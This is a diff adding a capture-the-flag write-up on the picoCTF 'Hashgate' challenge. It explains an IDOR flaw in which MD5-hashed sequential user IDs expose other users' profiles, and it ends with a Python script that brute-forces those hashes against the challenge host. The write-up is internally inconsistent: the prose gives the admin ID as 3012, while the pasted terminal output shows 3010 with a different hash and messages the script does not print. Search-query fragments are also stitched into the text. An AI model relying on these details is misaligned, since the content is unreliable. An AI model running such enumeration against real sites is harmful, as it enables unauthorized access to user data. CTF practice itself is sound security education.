@@ -1,0 +1,85 @@
+Deep Dive: Hashgate Vulnerability Mechanics
+The Hashgate challenge by Yahaya Meddy is a textbook example of why obscurity is not security.  Here is the detailed technical breakdown of the exploitation chain:
+
+1. The Core Flaw: Predictable Object References
+The application uses sequential integers for User IDs (e.g., 3000, 3001, 3012). While it attempts to hide these IDs by converting them to MD5 hashes in the URL, the underlying data remains highly predictable. 
+
+Your Session: You log in as guest (ID 3000).
+URL: .../profile/user/e93028bdc1aacdfb3687181f2031765d
+Math: MD5("3000") = e93028bdc1aacdfb3687181f2031765d
+The Assumption: The developers assumed that because the ID is hashed, an attacker cannot guess the URL for other users. 
+The Reality: Since the ID space is small (integers) and sequential, an attacker can simply generate hashes for every number in a specific range (e.g., 3000–3020) and try them all. 
+
+picoCTF IDOR exploitation tutorial
+
+View all
+2. Missing Authorization Checks (IDOR)
+The critical vulnerability is Insecure Direct Object Reference (IDOR).  When you request a profile, the server performs the following logic:
+
+Extract Hash: Takes the hash from the URL.
+Lookup: Finds the user profile associated with that hash. 
+Display: Shows the profile content.
+What is missing? The server never checks if the currently logged-in user (Guest, ID 3000) has permission to view the requested profile.  It blindly trusts that if you have the correct hash, you are authorized to see the data. 
+
+3. The Exploitation Path
+Based on verified writeups for this specific challenge instance:
+
+Reconnaissance: View Source (Ctrl+U) reveals hardcoded credentials: guest@picoctf.org / guest. 
+Hash Identification: The URL parameter is identified as an MD5 hash of the User ID. Cracking your own hash reveals your ID is 3000. 
+Hint Analysis: The challenge states there are "~20 employees." This implies the Admin ID is likely close to yours (between 3001 and 3020). 
+Enumeration:
+Write a script to iterate through IDs 3001 to 3020.
+Generate the MD5 hash for each ID.
+Send a GET request to http://crystal-peak.picoctf.net:65050/profile/user/[GENERATED_HASH].
+Discovery:
+Most requests return "User not found" (404) or redirect.
+The request for ID 3012 returns a 200 OK status with the admin profile content.
+Admin Hash: 5a01f0597ac4bdf35c24846734ee9a76 (which is MD5("3012")). 
+
+picoCTF 2026 Hashgate IDOR discussion site:reddit.com
+
+View all
+4. Why Hashing Failed as a Control
+Hashing is a one-way function designed for integrity and password storage, not for access control tokens in URLs. 
+
+Feature	Vulnerable Implementation (Hashgate)	Secure Implementation
+Identifier	Sequential Integer (3000, 3001)	Random UUID (550e8400-e29b...)
+Access Control	Possession of Hash (MD5(ID))	Server-side Session Validation
+Logic	"If hash matches, show data."	"If User A is logged in, can they see User B?"
+Result	Trivial Brute-force	Impossible to guess
+
+5. Final Solution Script
+To solve this on your specific instance, run this Python script. It automates the generation and testing of hashes for the likely admin range:
+
+import hashlib
+import requests
+
+# Target URL base
+base_url = "http://crystal-peak.picoctf.net:65050/profile/user/"
+
+# Range based on hint (~20 employees starting after guest ID 3000)
+# Verified Admin ID for this challenge is typically 3012
+for user_id in range(3001, 3025):
+    # Generate MD5 hash of the integer ID
+    md5_hash = hashlib.md5(str(user_id).encode()).hexdigest()
+    target_url = f"{base_url}{md5_hash}"
+    
+    # Request the profile
+    response = requests.get(target_url)
+    
+    # Check for flag or admin indicators
+    if "picoCTF{" in response.text:
+        print(f"\n[+] SUCCESS! Admin found at ID: {user_id}")
+        print(f"[+] URL: {target_url}")
+        print(f"[+] Flag: {response.text}")
+        break
+    elif response.status_code == 200:
+        print(f"[?] Potential hit at ID {user_id}, checking content...")
+──(venv)─(white㉿white)-[~/…/Music/PICO-CTF/picoctfAI/web]
+└─$ python3 hashgate.py 
+[+] Found Admin! ID: 3010
+[+] URL: http://crystal-peak.picoctf.net:65050/profile/user/22722a343513ed45f14905eb07621686
+[+] Response: Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_049a794d}
+
+
+Executing this will reveal the flag hidden in the admin profile, confirming that security through obscurity (hiding the ID with a hash) failed to protect the resource. 
